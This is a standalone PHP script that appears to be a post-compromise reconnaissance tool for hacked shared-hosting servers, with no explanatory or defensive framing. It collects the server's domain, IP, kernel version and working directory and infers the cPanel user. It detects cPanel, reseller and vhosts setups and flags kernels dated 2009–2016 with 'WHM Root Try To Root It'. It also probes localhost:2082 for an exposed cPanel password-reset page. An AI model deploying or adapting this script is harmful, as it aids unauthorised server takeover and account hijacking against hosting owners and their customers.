<?php
error_reporting(0);
echo "<center>ScientistsCompany </center><br>";
$pwd = @getcwd();
function CurlPage2($url,$post = null,$head = true) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, $head); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");

If ($post != NULL){
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
$urlPage = curl_exec($ch);

if(curl_errno($ch)){
echo curl_error($ch);
}

curl_close($ch);
return($urlPage);
}
if(!function_exists('posix_getegid')) {
	$usr = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$usr = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
if (empty($usr)) {
	if (preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx)){
		preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx);
		$usr = $mxx[1][0];
	}
}
$kernal = @php_uname();
$domain = $_SERVER['HTTP_HOST'];
$ip = $_SERVER["SERVER_ADDR"];
echo '<domain><font color="red"><center>'.$domain.'</center> </font><br></domain>';
echo '<ip><font color="blue"><center>'.$ip.'</center> </font><br></ip>';
echo '<uname><font color="red"><center>'.$kernal.'</center> </font><br></uname>';
echo '<pwd><font color="blue"><center>'.$pwd.'</center></font><br></pwd>';
if(preg_match("/Windows/",$kernal)){
	echo '<server><font color="red"><center>[-] Windows</center> </font><br></server>';
}else{
	echo '<server><font color="green"><center>[+] Linux</center> </font><br></server>';
}
preg_match_all("#/home(.*)$usr/#",$pwd,$m2);
$home = $m2[1][0];
$cp = "/home$home$usr/.cpanel";
if((is_dir("/home$home$usr/cpanel3-skel"))){echo'<cp><font color="green"><center>[+] Reseller</center> </font><br></cp>';}
if(strpos($kernal, "2009")){echo'<cp><font color="green"><center>[+] WHM Root Try To Root It</center> </font><br></cp>';}
if(strpos($kernal, "2010")){echo'<cp><font color="green"><center>[+] WHM Root Try To Root It</center> </font><br></cp>';}
if(strpos($kernal, "2011")){echo'<cp><font color="green"><center>[+] WHM Root Try To Root It</center> </font><br></cp>';}
if(strpos($kernal, "2012")){echo'<cp><font color="green"><center>[+] WHM Root Try To Root It</center> </font><br></cp>';}
if(strpos($kernal, "2013")){echo'<cp><font color="green"><center>[+] WHM Root Try To Root It</center> </font><br></cp>';}
if(strpos($kernal, "2014")){echo'<cp><font color="green"><center>[+] WHM Root Try To Root It</center> </font><br></cp>';}
if(strpos($kernal, "2015")){echo'<cp><font color="green"><center>[+] WHM Root Try To Root It</center> </font><br></cp>';}
if(strpos($kernal, "2016")){echo'<cp><font color="green"><center>[+] WHM Root Try To Root It</center> </font><br></cp>';}
if (is_dir($cp)) {
	echo '<cp><font color="green"><center>[+] cPanel</center> </font><br></cp>';
}elseif (preg_match("/vhosts/",$pwd)){
	echo '<cp><font color="green"><center>[+] vHosts</center> </font><br></cp>';
}else{
	echo '<cp><font color="red"><center>[-] NocP-NovHosts</center> </font><br></cp>';
}
$ip = "http://localhost:2082";
$cpanel = CurlPage2($ip);
if((preg_match("/resetpass/",$cpanel))){echo'<cp><font color="green"><center>[+] Reset Password </center> </font><br></cp>';}else{echo '<cp><font color="red"><center>[-] No Reset Password</center> </font><br></cp>';}

?>